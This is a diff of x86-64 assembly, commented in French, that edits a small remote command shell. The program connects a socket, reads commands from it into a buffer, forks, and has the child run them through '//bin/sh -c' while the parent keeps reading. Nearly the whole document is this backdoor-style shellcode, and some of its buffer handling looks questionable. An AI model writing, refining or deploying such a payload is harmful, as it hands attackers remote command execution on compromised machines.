@@ -1,13 +1,11 @@
 BITS 64
 
 SECTION .bss
-	sock_buffer resb 2048
+	sock_buffer resb 255
 
 SECTION .text
 global _start
 _start:
-
-
 
 ; ----- () sys_socket -----
 _socket:
@@ -47,8 +45,10 @@ _connect:
         mov al, 42
         syscall
 
-_read:
+
 ; ----- (0) sys_read (unsigned int fd, char *buf, size_t count) -----
+_read:
+    xor r12, r12
 	xor rax, rax
 	xor rdi, rdi
 	xor rsi, rsi
@@ -58,47 +58,44 @@ _read:
 	
 	push sock_buffer
 	mov rsi, rsp			; rsi <- char *buf : 
-					;      destination (on alloue une la taille de 2048 à la mémoire)
+					        ; destination (on alloue une la taille de 2048 à la mémoire)
 		
-	mov rdx, 2048			; rdx <- size_t count : on lui donne la taille du buffer
-	;mov rdx, 2
-	
+	mov rdx, 255			; rdx <- size_t count : on lui donne la taille du buffer
 	syscall
-
-	mov r12, [rsi]
-
+	mov r12, [rsi]          ; mov fd dans r12 pour l'utiliser plutard
 
 ; ---- (57) sys_fork ----
 _fork:
-	;mov rdi, rax			; on récupère le socket
+    xor rax, rax
 	mov al, 57			; sys_fork
 	syscall
 
 	cmp rax, 0			; compare if in child process
 	jz _execve			; jmp in child process sys_read and sys_execve if in child process
 
-	jmp _read			; jmp in parent sys_connect if i parent process
+	jmp _read			; jmp in parent sys_connect if in parent process
 
-; ----- (59) execve (const char *filename, const char *const argv[], const char *const envp[])-----
+
+; ----- (59) execve (const char *filename, const char *const argv[], const char *const envp[]) -----
 _execve:
 	xor rax, rax
-        xor rbx, rbx
-        xor rcx, rcx
+    xor rbx, rbx
+    xor rcx, rcx
 	xor rsi, rsi	
 	xor r13, r13
         
 	push rbx
-        mov rbx, 0x68732f6e69622f2f     ; //bin/sh
+    mov rbx, 0x68732f6e69622f2f     ; //bin/sh
         
 	push rcx			; push 0
 	push rbx			; push //bin/sh
-        mov rdi, rsp                    ; rdi arg : const char *filename
+    mov rdi, rsp        ; rdi arg : const char *filename
 
 	push rcx			; push 0 -> cleaning stack
 
-	mov r13, 0x632d			; "-c"
+	mov r13, 0x632d		; "-c"
 	push r13			; push "-c"
-	mov r14, rsp			; char * '-c'
+	mov r14, rsp		; char * '-c'
 	
 	push rcx			; push 0
 	
@@ -108,7 +105,7 @@ _execve:
 	push rcx			; push 0
 
 	push rbx			; push //bin/sh (rbx)
-	mov rbx, rsp			; char * '//bin/sh'
+	mov rbx, rsp		; char * '//bin/sh'
 	
 	push rcx			; push 0 -> cleaning stack
 
@@ -117,7 +114,7 @@ _execve:
 	push rbx			; push //bin/sh
 
 	mov rsi, rsp			; get [ //bin/sh, -c, fd_sock_buffer ]
+    mov rdx, rcx
 
-        mov al, 59                      ; syscall 59 - execve
-        syscall
-
+    mov al, 59                      ; syscall 59 - execve
+    syscall
